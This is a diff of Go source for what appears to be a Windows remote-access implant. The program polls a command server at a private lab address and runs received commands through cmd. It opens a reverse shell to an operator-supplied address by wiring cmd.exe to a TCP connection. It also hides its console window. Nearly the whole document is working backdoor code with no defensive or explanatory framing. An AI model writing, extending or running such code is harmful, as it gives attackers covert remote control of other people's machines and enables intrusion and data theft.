@@ -8,6 +8,7 @@ import (
     "net"
     "net/http"
     "os/exec"
+    "strings"
     "sync"
     "syscall"
     "time"
@@ -17,24 +18,7 @@ var (
     mu               sync.Mutex
     isCommandRunning bool
     serverURL        = "http://192.168.56.101:5000"
-    listenerAddress  = "192.168.56.101:4444"
 )
-
-var kernel32 = syscall.NewLazyDLL("kernel32.dll")
-var user32 = syscall.NewLazyDLL("user32.dll")
-
-var (
-    procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
-    procShowWindow       = user32.NewProc("ShowWindow")
-)
-
-func hideConsoleWindow() {
-    consoleWindow, _, _ := procGetConsoleWindow.Call()
-    if consoleWindow == 0 {
-        return // No console window attached
-    }
-    procShowWindow.Call(consoleWindow, 0) // SW_HIDE = 0
-}
 
 type Command struct {
     ID  string `json:"id"`
@@ -75,37 +59,36 @@ func sendResult(result CommandResult) {
 }
 
 func executeCommandAndSendResult(cmd Command) {
-    if cmd.Cmd == "shell" {
-        // Specific handling for the "shell" command to open a reverse shell
-        openReverseShell()
+    if strings.HasPrefix(cmd.Cmd, "shell ") {
+        address := strings.TrimSpace(strings.TrimPrefix(cmd.Cmd, "shell"))
+        if address != "" {
+            openReverseShell(address) // Pass the extracted address to openReverseShell
+        } else {
+            fmt.Println("No address specified for shell command")
+        }
     } else {
-        // Execute other commands
+        // Example of executing a non-shell command
         output, err := exec.Command("cmd", "/C", cmd.Cmd).CombinedOutput()
         resultText := string(output)
         if err != nil {
             resultText += "\nError: " + err.Error()
         }
-
         result := CommandResult{
             ID:     cmd.ID,
             Result: resultText,
         }
-
         sendResult(result)
     }
 }
 
-func openReverseShell() {
-    // Implementation of the reverse shell functionality
-    // Depending on your exact requirements, this could connect back to a netcat listener or similar
-    // This is placeholder logic; ensure you replace it with your specific reverse shell implementation
-    conn, err := net.Dial("tcp", listenerAddress)
+func openReverseShell(address string) {
+    conn, err := net.Dial("tcp", address)
     if err != nil {
-        fmt.Printf("Failed to open reverse shell to %s: %v\n", listenerAddress, err)
+        fmt.Printf("Failed to open reverse shell to %s: %v\n", address, err)
         return
     }
     defer conn.Close()
-    
+
     cmd := exec.Command("cmd.exe")
     cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
     if err := cmd.Run(); err != nil {
@@ -142,4 +125,20 @@ func main() {
     }()
 
     select {} // Prevent the application from exiting immediately
+}
+
+var kernel32 = syscall.NewLazyDLL("kernel32.dll")
+var user32 = syscall.NewLazyDLL("user32.dll")
+
+var (
+    procGetConsoleWindow = kernel32.NewProc("GetConsoleWindow")
+    procShowWindow       = user32.NewProc("ShowWindow")
+)
+
+func hideConsoleWindow() {
+    consoleWindow, _, _ := procGetConsoleWindow.Call()
+    if consoleWindow == 0 {
+        return // No console window attached
+    }
+    procShowWindow.Call(consoleWindow, 0) // SW_HIDE = 0
 }
